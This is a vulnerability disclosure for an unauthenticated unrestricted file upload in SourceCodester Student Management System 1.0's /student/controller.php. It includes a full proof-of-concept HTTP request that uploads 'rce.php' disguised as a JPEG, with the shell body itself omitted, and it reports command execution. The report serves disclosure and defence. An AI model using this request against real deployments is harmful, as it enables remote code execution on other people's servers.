# SourceCodester Student Management System 1.0 controller.php Unrestricted Upload
# NAME OF AFFECTED PRODUCT(S)
+ Student Management System
## Vendor Homepage
+ https://www.sourcecodester.com/php/14268/student-management-system.html#google_vignette
# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ Schnee
## Vulnerable File
+ /student/controller.php
## VERSION(S)
+ V1.0
## Software Link
+ https://www.sourcecodester.com/sites/default/files/download/Kabir%20M.%20Alhasan/studentmanagement.zip
# PROBLEM TYPE 
## Vulnerability Type
+ File upload
## Root Cause
+ The input obtained through doupdateimage in line 218 of the student\controller.php file is used by doupdateimage in line 237 of the student\controller.php file to determine the location of the file to be written, which may allow attackers to change or damage the content of the file, or create a brand new file
+ ![2](https://github.com/I-Schnee-I/cev/assets/58547398/429ef6c5-e524-454a-a352-2f5e7d84082d)
## Impact
+ Attackers can exploit this vulnerability for unrestricted uploads, and remote attacks may result in RCE.
# DESCRIPTION
+ Schnee found that the file upload operation was triggered in /student/controller.php, and the _FAILE variable was used to receive the payload. After receiving the attack vector from a remote attacker, it will result in unrestricted uploads, and remote attacks may lead to RCE.
# Vulnerability details and POC
## Payload
## This process does not require any user login and can also be uploaded
+ The picture I uploaded here is a photo of carrying a Trojan horse, but due to character confusion, I took a screenshot directly.
+ ![4](https://github.com/I-Schnee-I/cev/assets/58547398/ca9fc746-a74d-4e64-ae93-27c49571b19d)
```
POST /student/controller.php?action=photos HTTP/1.1
Host: 192.168.224.132:8100
Content-Length: 2219
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiu8L6gw9ImP0UMa1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryiu8L6gw9ImP0UMa1
Content-Disposition: form-data; name="photo"; filename="rce.php"
Content-Type: image/jpeg

Node:Sorry, due to some coding reasons, I am unable to use markdown to store image data with attack payloads here.

------WebKitFormBoundaryiu8L6gw9ImP0UMa1
Content-Disposition: form-data; name="submit"

æäº¤
------WebKitFormBoundaryiu8L6gw9ImP0UMa1--
```
+ ![3](https://github.com/I-Schnee-I/cev/assets/58547398/ed7b3fa7-48e3-48eb-87aa-46a84720b325)
## This file upload vulnerability will automatically add a timestamp before the name of the uploaded file.
+ Successfully utilized file with payload and executed ipconfig command
+ ![1](https://github.com/I-Schnee-I/cev/assets/58547398/e6859973-9f05-4062-a79b-d2ae2c837d18)



------------------https://github.com/CveSecLook/cve/issues/16
